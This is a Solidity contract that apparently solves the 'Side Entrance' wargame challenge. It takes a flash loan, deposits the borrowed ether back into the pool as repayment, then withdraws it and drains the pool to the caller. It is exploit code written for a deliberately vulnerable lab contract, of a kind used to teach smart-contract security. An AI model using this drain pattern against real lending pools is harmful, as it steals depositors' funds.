pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract FlashLoanEtherReceiver {
    using Address for address payable;
    ISideEntranceLenderPool private immutable pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    function execute() public payable {
        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
        
    }

    function executeFlashLoan(uint256 amount) external {
        pool.flashLoan(amount);
        ISideEntranceLenderPool(pool).withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
}
